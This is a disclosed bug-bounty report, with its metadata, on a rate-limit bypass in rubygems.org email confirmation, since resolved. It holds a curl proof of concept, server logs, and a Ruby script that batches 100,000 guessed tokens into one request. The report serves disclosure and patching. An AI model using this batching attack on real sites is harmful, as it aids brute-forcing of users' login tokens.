{
  "id": 1559262,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTU5MjYy",
  "url": "https://hackerone.com/reports/1559262",
  "title": "rubygems.org Batching attack to `confirmation_token` by bypass rate limit",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2022-05-05T01:07:11.658Z",
  "submitted_at": "2022-05-05T01:07:11.729Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "ooooooo_q",
    "url": "/ooooooo_q",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/9a55e00ecd2cdf18a7f40678e6836e4cdc90bf95eb4b50c43f5fb775da40bb65"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ4ABT4GR%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T142511Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBy6B6CaeGOQsHQEVf6mmFMeFsyrU6xwojWydbGY7RrjAiEAt098VbuwY4XR0q%2FhT1%2BwOM5SQIHiByhn7YH5ul9I%2Bn0qsQUIdRADGgwwMTM2MTkyNzQ4NDkiDFBaVga66U2cxXTWDSqOBZ9tNE39KmDEn1M4BXloMcPBeBllafRlZWXN4mbzGTLJ8XKW77G1i6rQMiYeX0mALiTgT6%2BCHJg%2FXOkgcCoWTiU8AGVS8ygbrG6Rmef84ITNYSRHXYOiAmAtLriRM0FNkbvdPDxzRHKptbdJe%2FxQx6iHxnF4Wbz2d%2BiPKmLG1dOUk9Wd5PcY6e%2FpFK3MQHhbP60DtFaNSQZiLijq7McbVpknudWszl6E666zMtQlGzHcdmQhcfLUGV%2Fh2eQIW07Q8StsP0DnifOlRfH5wmBWZeOVGiQmAiu4vix6Kx70b5sEUa60B8XEzX3iLRbRpvoMJI2iFfwEhBUfyAO2kQFI891jfDtZMWBRAeJzS2TDBSZOFWdllL1Ku5BlluxzcTwgDBcj6U9BeRoIR%2FE%2F%2FzJhFrI6sO4C9sHXlsgFD4n6%2BV%2BMht3eSvRmwlqvwAGbQgoXg1TnmoDMTwU9bHj7KKScAqVQBI8hZ2NsP8SjJg8QJ0z%2BQTTuA8uOznjEUpW73jDmEQTBVhmpeZcwxP4%2BU6nQB8LguHWkl5NBmrNRrQGJGWsRxHHT40HVpMkdUBcHLz%2BE4kW3xThQV2%2FnlNJrQbkP9idnhRNm421huVhZIih2gBVsmfHNfFtpBWAgyhZal1fyaA5PfM8x1h1HAwbgAbx5pWpwX6P35EkSqglhC9hYX4Mx81Hh8c9ng5X9OnjAGOW2svJkxKq9ucSCCtD2ch3QThvWYUo6MweIyhK%2Fc7x1IsUKbcstBILZpn1l%2BukPwZKsmW0eclxFPYN5toUHjUictBuWWthA5Xkwhoewwr4uhuDUwpqTTEYBtxfAUMWwC9b4A0nNdO5YVjG1Et5gL7AXZuOawjRSr2cgQxq4C6b5gjDCs62uBjqxAShKZyKgt2m88YD0Vj8P6tXU495dvL8RKU8No53RBpg%2B0AGbaXTXUqyqWqfJgpK4Oo5BMDBxlCeUem5zsmh5i1y96ARljDRINVqBbClSxSFkigseR0xhxtkfysRfAXQQYk56acdX1y%2FUUtxG304UkKPWzZsl%2FZfaTuT815tCTUHh387Az8zDogkBD5OMCSblOcOAbl2D84THnFg9dMo8QXW7aVKysLeRwOxI5twdQX9Gug%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=036b62ff2717775183bcdab0722ac3461f291363c49225fda2a1e22ec991be8b",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ4ABT4GR%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T142511Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBy6B6CaeGOQsHQEVf6mmFMeFsyrU6xwojWydbGY7RrjAiEAt098VbuwY4XR0q%2FhT1%2BwOM5SQIHiByhn7YH5ul9I%2Bn0qsQUIdRADGgwwMTM2MTkyNzQ4NDkiDFBaVga66U2cxXTWDSqOBZ9tNE39KmDEn1M4BXloMcPBeBllafRlZWXN4mbzGTLJ8XKW77G1i6rQMiYeX0mALiTgT6%2BCHJg%2FXOkgcCoWTiU8AGVS8ygbrG6Rmef84ITNYSRHXYOiAmAtLriRM0FNkbvdPDxzRHKptbdJe%2FxQx6iHxnF4Wbz2d%2BiPKmLG1dOUk9Wd5PcY6e%2FpFK3MQHhbP60DtFaNSQZiLijq7McbVpknudWszl6E666zMtQlGzHcdmQhcfLUGV%2Fh2eQIW07Q8StsP0DnifOlRfH5wmBWZeOVGiQmAiu4vix6Kx70b5sEUa60B8XEzX3iLRbRpvoMJI2iFfwEhBUfyAO2kQFI891jfDtZMWBRAeJzS2TDBSZOFWdllL1Ku5BlluxzcTwgDBcj6U9BeRoIR%2FE%2F%2FzJhFrI6sO4C9sHXlsgFD4n6%2BV%2BMht3eSvRmwlqvwAGbQgoXg1TnmoDMTwU9bHj7KKScAqVQBI8hZ2NsP8SjJg8QJ0z%2BQTTuA8uOznjEUpW73jDmEQTBVhmpeZcwxP4%2BU6nQB8LguHWkl5NBmrNRrQGJGWsRxHHT40HVpMkdUBcHLz%2BE4kW3xThQV2%2FnlNJrQbkP9idnhRNm421huVhZIih2gBVsmfHNfFtpBWAgyhZal1fyaA5PfM8x1h1HAwbgAbx5pWpwX6P35EkSqglhC9hYX4Mx81Hh8c9ng5X9OnjAGOW2svJkxKq9ucSCCtD2ch3QThvWYUo6MweIyhK%2Fc7x1IsUKbcstBILZpn1l%2BukPwZKsmW0eclxFPYN5toUHjUictBuWWthA5Xkwhoewwr4uhuDUwpqTTEYBtxfAUMWwC9b4A0nNdO5YVjG1Et5gL7AXZuOawjRSr2cgQxq4C6b5gjDCs62uBjqxAShKZyKgt2m88YD0Vj8P6tXU495dvL8RKU8No53RBpg%2B0AGbaXTXUqyqWqfJgpK4Oo5BMDBxlCeUem5zsmh5i1y96ARljDRINVqBbClSxSFkigseR0xhxtkfysRfAXQQYk56acdX1y%2FUUtxG304UkKPWzZsl%2FZfaTuT815tCTUHh387Az8zDogkBD5OMCSblOcOAbl2D84THnFg9dMo8QXW7aVKysLeRwOxI5twdQX9Gug%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=562fa0a3eeb3cd91119099fe3876f896f508de9ab9c3878ab192029ff0dd7a82"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2022-07-13T04:04:52.151Z",
  "bug_reporter_agreed_on_going_public_at": "2022-07-13T04:04:52.096Z",
  "team_member_agreed_on_going_public_at": "2022-07-12T19:34:12.409Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "The following is copied from hackerone's report.  https://hackerone.com/reports/1529183\n\n---\n\nI confirmed that EmailConfirmationsController has the same problem as https://hackerone.com/reports/449356 .\n\nhttps://github.com/rubygems/rubygems.org/blob/962dba88995c98973f52fa84faebce4a62cd56e3/app/controllers/email_confirmations_controller.rb#L55\n\n```ruby\n  def validate_confirmation_token\n    @user = User.find_by(confirmation_token: params[:token])\n    redirect_to root_path, alert: t(\"failure_when_forbidden\") unless @user&.valid_confirmation_token?\n  end\n```\n\nUsing an array in `params[:token]` makes searching for `confirmation_token` more efficient.\n\n### PoC\n\n1. start server in local\n2. Access url with multiple token\n\n```\n❯ curl --globoff 'http://127.0.0.1:3000/email_confirmations/confirm?token[]=key1&token[]=key2'\n\n<html><body>You are being <a href=\"http://127.0.0.1:3000/\">redirected</a>.</body></html>%\n```\n\n#### rails log\n\n```ruby\nStarted GET \"/email_confirmations/confirm?token[]=[FILTERED]&token[]=[FILTERED]\" for 127.0.0.1 at 2022-04-03 17:54:41 +0900\nProcessing by EmailConfirmationsController#update as HTML\n  Parameters: {\"token\"=>\"[FILTERED]\"}\n  User Load (1.8ms)  SELECT \"users\".* FROM \"users\" WHERE \"users\".\"confirmation_token\" IN ($1, $2) LIMIT $3  [[\"confirmation_token\", \"key1\"], [\"confirmation_token\", \"key2\"], [\"LIMIT\", 1]]\n  ↳ app/controllers/email_confirmations_controller.rb:56:in `validate_confirmation_token'\nRedirected to http://127.0.0.1:3000/\nFilter chain halted as :validate_confirmation_token rendered or redirected\nCompleted 302 Found in 71ms (ActiveRecord: 26.5ms | Elasticsearch: 0.0ms | Allocations: 3613)\n```\n\n### batching attack\n\n```ruby\nrequire 'net/http'\nrequire 'securerandom'\nrequire 'json'\n\n# https://github.com/thoughtbot/clearance/blob/main/lib/clearance/token.rb\nkeys = 100_000.times.map{SecureRandom.hex(20).encode('UTF-8')}\n\nuri = URI.parse(\"http://127.0.0.1:3000/email_confirmations/confirm\")\nhttp = Net::HTTP.new(uri.host, uri.port)\nreq = Net::HTTP::Get.new(uri.path)\nreq[\"Content-Type\"] = \"application/json\"\nreq.body = {token: keys}.to_json\n\nres = http.request(req)\nputs res.body\n```\n\nIn the previous report, 65534 was the limit, but due to a change in the behavior of rails, it is possible to send more numbers.\n\n## Impact\n\nThere is a rate limit for accessing websites, but this method allows attacker to confirm a large number of tokens.\n\nhttps://guides.rubygems.org/rubygems-org-rate-limits/\n> API and website: 10 requests per second\n\nIf authentication by `validate_confirmation_token` is successful, users who have a valid confirm_token and have not set up multi-factor authentication will be able to sign in.\n\nhttps://github.com/rubygems/rubygems.org/blob/962dba88995c98973f52fa84faebce4a62cd56e3/app/controllers/email_confirmations_controller.rb#L5\n\n```ruby\n  def update\n    if @user.mfa_enabled?\n      @form_url = mfa_update_email_confirmations_url(token: @user.confirmation_token)\n      render template: \"multifactor_auths/otp_prompt\"\n    else\n      confirm_email_success\n    end\n  end\n```  \n\nhttps://github.com/rubygems/rubygems.org/blob/962dba88995c98973f52fa84faebce4a62cd56e3/app/controllers/email_confirmations_controller.rb#L62\n\n```ruby\n  def confirm_email_success\n    @user.confirm_email!\n    sign_in @user\n    redirect_to root_path, notice: t(\"email_confirmations.update.confirmed_email\")\n  end\n```\n\n---\n\nI confirmed the number of tokens that can be sent in one request, it seems to be around 2 million.\n\nThe value of `client_max_body_size` of nginx setting in rubygems.org is `500M`, and it seems that attacker can send up to about 12 million tokens when sending using json. https://github.com/rubygems/rubygems.org/blob/master/config/deploy/nginx-configmap.yaml.erb#L79\nHowever, when I confirmed the operation locally, sending more than 2 million tokens made it easier for unexplained postgresql errors to occur.\n\n```\nrubygemsorg-db-1         | 2022-04-17 01:58:24.498 UTC [1] LOG:  server process (PID 230) was terminated by signal 9: Killed\nrubygemsorg-db-1         | 2022-04-17 01:58:24.498 UTC [1] DETAIL:  Failed process was running: SELECT \"users\".* FROM \"users\" WHERE \"users\".\"confirmation_token\" IN ('efb0f7101d9fe1daff206d3cfaadf127fcce71fe', '0ae1522d7cc5a65e40d69c25e52b4dcd364930ac', 'c8cd10691f2ed50c42df9f932091d1feefb0b679', '567860e213a4e77aadfd416bc3b773570791542e', 'd47d8646d42d74030384c735799da5b2e999520b', 'd1fafdf37922b299350302dd3c7fd7e6def10308', '1e46e4e5c32a7ea7d95585b87131f06fac27af9d', 'ee80d17ab17509028033d4018a38d3582f0c2410', '2d36a83d29d8ff07b28cec46f0b66c61e5fa4aff', 'd6bfe631f2239640e756bbde772a487ae20cc302', '832108d67aa3b476702a112a1354c660f901560d', 'ba4423b0a1afb1dbbe88e39ffc5a69f6b3e7ae13', '05a58cf07ade4f24727cf43ccbdf4676e941167a', '4fdde1bde7ab049c4d48968dca165b6fff18e776', '91246d1975e252ca97896dd425537b5204cddf58', '0884a42b8745b0255c1675ce788a25e58bccfdbe', 'd6343d92d9b797a8fc8a0b6ea456ada6b219088e', 'fd0050ead3c2463e5351730d488bf2382fb7e70c', '5b358bb1e938bcce5faa60caff18a76917a487f0', '3ac27a5ebeb7f863529afdfc236b9c1356fda7bc', '1a9d407152249861dc4a018d5fafd0ddb34841ae', '1c6e5ca9dacfea97030d87abef46f\nrubygemsorg-db-1         | 2022-04-17 01:58:24.499 UTC [1] LOG:  terminating any other active server processes\nrubygemsorg-db-1         | 2022-04-17 01:58:24.501 UTC [227] WARNING:  terminating connection because of crash of another server process\n```\n\nCalculated, the time required for one IP address brute force is 1915427376 years.\n\n```\n16 ** 20 / (2_000_000 * 10) / 3600 / 24 / 365.25\n=> 1915427376.6297057\n```\n\nConsidering that a valid confirm_token exists for each user and that it is sent from multiple IPs using botnet, etc., it is likely to be a few more digits lower.\n\nHowever, since the confirm_token has an expiration time of 3 hours, it would have been safe enough.\nhttps://github.com/rubygems/rubygems.org/search?q=EMAIL_TOKEN_EXPRIES_AFTER",
  "bounty_amount": "480.0",
  "formatted_bounty": "$480",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2022-08-11T19:34:12.520Z",
  "allow_singular_disclosure_after": -47587858.60672243,
  "singular_disclosure_allowed": true,
  "vote_count": 11,
  "voters": [
    "drsniper",
    "zy9ard3",
    "thruster",
    "h4x0r_dz",
    "0x1622",
    "shivammusic",
    "asterfiest",
    "fthacker101",
    "subh___",
    "dagregi",
    "and 1 more..."
  ],
  "severity": {
    "rating": "low",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 89856,
    "asset_type": "URL",
    "asset_identifier": "rubygems.org",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 173725,
      "category": "team",
      "content": "Bypass rate limit on email confirmation\n\nSummary\nIt was possible to send multiple confirmation_token in the same request for email verification using an array in the query string. Example request: http://127.0.0.1:3000/email_confirmations/confirm?token[]=key1&token[]=key2. It could have been used to bypass our rate limit of 100 req/10 minutes.\n\nImpact\nIt makes the confirmation_token slightly easier to guess. It would still have required more than a billion years to brute-force the confirmation token using a single IP.\n\nPatches\nPlease check [#3013](https://github.com/rubygems/rubygems.org/pull/3013) for details of the patch.\n\nGHSA Link: https://github.com/rubygems/rubygems.org/security/advisories/GHSA-559f-r7wx-f4qv",
      "user": {
        "id": 904892,
        "username": "kunderkoffler",
        "name": "Kayla Underkoffler",
        "bio": null,
        "cleared": false,
        "verified": false,
        "website": null,
        "location": null,
        "created_at": "2020-01-13T19:26:22.339Z",
        "url": "https://hackerone.com/kunderkoffler",
        "hackerone_triager": false,
        "hackerone_employee": true,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "xtralarge": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
